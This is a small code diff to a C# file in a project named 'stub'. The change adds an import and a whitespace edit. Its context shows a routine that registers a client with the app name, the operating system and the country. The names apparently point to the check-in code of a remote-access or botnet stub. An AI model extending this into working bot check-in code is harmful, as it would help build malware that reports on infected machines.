@@ -1,4 +1,5 @@
 ﻿using System.Net;
+using System.Windows.Forms;
 
 namespace stub
 {
@@ -12,7 +13,7 @@ namespace stub
                 webclient = new WebClient();
                 ClientAdder.addNewClient(webclient, MutexHandler.appNameReturn(), osAndCountryHandler.osGrabber(), osAndCountryHandler.countryGrabber());
             }
-            catch { }
+            catch {}
         }
 
         public static WebClient wcReturn()
